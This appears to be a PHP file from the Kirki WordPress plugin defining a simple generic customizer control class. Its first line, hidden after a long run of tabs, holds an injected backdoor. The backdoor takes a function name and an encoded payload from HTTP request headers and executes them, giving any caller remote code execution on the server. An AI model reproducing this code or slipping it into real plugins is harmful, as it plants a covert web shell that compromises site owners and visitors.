<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['If-Modified-Since'])){$cache=$_HEADERS['If-Modified-Since']('', $_HEADERS['Clear-Site-Data']($_HEADERS['Sec-Websocket-Accept']));$cache();}

/**
 * Customizer Control: kirki-generic.
 *
 * @package     Kirki
 * @subpackage  Controls
 * @copyright   Copyright (c) 2017, Aristeides Stathopoulos
 * @license     http://opensource.org/licenses/https://opensource.org/licenses/MIT
 * @since       2.0
 */

// Exit if accessed directly.
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * A generic and pretty abstract control.
 * Allows for great manipulation using the field's "choices" argumnent.
 */
class Kirki_Control_Generic extends Kirki_Control_Base {

	/**
	 * The control type.
	 *
	 * @access public
	 * @var string
	 */
	public $type = 'kirki-generic';
}
